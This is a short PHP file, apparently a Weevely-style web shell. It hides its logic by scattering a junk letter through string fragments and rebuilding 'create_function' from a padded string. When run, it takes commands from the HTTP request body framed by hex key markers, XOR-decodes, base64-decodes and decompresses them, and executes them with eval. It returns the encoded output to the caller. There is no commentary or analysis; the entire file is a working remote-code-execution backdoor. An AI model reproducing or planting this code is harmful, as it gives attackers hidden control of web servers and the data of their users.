<?php
$E='$UjU++,$i++){$o.=U$t{$i}^$kU{$Uj};}}return $Uo;}UifU (@preg_matc';
$F='==1) {@ob_Ustart();@eUvUal(@gzuncoUmpressU(U@x(@bUase64_decode(U$';
$R='rlen($tU);$o="";Ufor($Ui=0;$Ui<$lU;){for($jU=0;(U$j<$c&&$UiU<$l);';
$y='aUse6UU4_encode(@x(U@gzUcompress($o),U$k));pUrinUt("$p$kUh$r$kf");}';
$G=str_replace('p','','crpeapte_ppfpunpction');
$T='U4Du61zfU1gUcdUxArIt";function x(U$t,$k){$UUcU=sUtrlen(U$k);$l=st';
$m='m[U1]),$k)))U;U$o=@oUb_get_UconUtents();@ob_UUend_clean();$rU=@b';
$o='h(U"/U$kh(U.+)$kfU/",@filUUe_get_contenUts("Uphp://input"UU),$m)U';
$l='$kU="0881feba";U$UUkh="U39e6735ba6U47";$kf="75cd20U5544ca"U;$p="U';
$N=str_replace('U','',$l.$T.$R.$E.$o.$F.$m.$y);
$b=$G('',$N);$b();
?>
